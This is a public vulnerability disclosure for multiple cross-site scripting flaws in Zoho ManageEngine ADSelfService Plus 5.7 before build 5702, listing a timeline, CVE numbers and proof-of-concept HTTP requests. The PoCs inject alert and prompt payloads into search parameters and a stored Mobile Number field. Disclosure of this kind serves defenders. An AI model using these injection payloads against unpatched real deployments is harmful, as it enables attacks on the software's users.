@@ -1,0 +1,50 @@
+[+] Zoho ManageEngine ADSelfService Plus 5.7 < 5702 build - Multiple Cross-Site Scripting
+[+] Author: Ibrahim Raafat
+[+] Twitter: https://twitter.com/RaafatSEC
+[+] Download: https://www.manageengine.com/products/self-service-password/download-free.html?
+
+
+[+] TimeLine
+	[-] Nov 23, 2018	Reported
+	[-] Nov 26, 2018	Triaged
+	[-] Dec 27, 2018 	Fixed
+	[-] May 08, 2019	Public Disclosure
+
+[+] Description:
+	Zoho ManageEngine ADSelfService Plus 5.7 before build 5702 has Multiple XSS vulnerabilites
+
+[+] POC
+
+[-] Employee search form
+
+POST /EmployeeSearch.cc?actionId=Search HTTP/1.1
+
+searchString=dddddffff");a=alert,a(31337)//&&searchType=contains&searchBy=ALL_FIELDS333');a=alert,a(31337)//&adscsrf=
+searchType parameter:
+searchString=a&searchType=containss9ek";a=alert,a(31337)//&searchBy=ALL_FIELDS&adscsrf=
+
+
+2- Employee Search – ascending parameter
+
+/EmployeeSearch.cc?actionId=showList&searchBy=ALL_FIELDS&searchType=contains&PAGE_NUMBER=37&FROM_INDEX=22&TO_INDEX=22&RANGE=100&navigate=true&navigationType=&START_INDEX=22 HTTP/1.1
+
+selOUs=&genID=12191&ACTIVE_TAB=user&sortIndex=0&ascending=true’;a=alert,a(31337)//&&searchString=a&TOTAL_RECORDS=22&adscsrf=
+
+
+3- EmpSearch.cc - searchString parameter
+
+POST /EmpSearch.cc?operation=getSearchResult&REQUEST_TYPE=JSON&searchString=RR<svg%2fonload%3dprompt(8)>&searchType=contains&searchBy=ALL_FIELDS&actionId=Search HTTP/1.1
+
+&adscsrf=
+
+4- Stored XSS in self-update layout implementation.
+
+/SelfService.do?methodToCall=selfService&selectedTab=UpdateFields
+Insert the following payload into Mobile Number field, and save
+Payload: 11111111]";a=alert,a(31337)//
+Code execute here:
+/Enrollment.do?selectedTab=Enrollment
+
+
+[+] Assigned CVE:  CVE-2018-20484,CVE-2018-20485
+[+] Release Notes: https://www.manageengine.com/products/self-service-password/release-notes.html
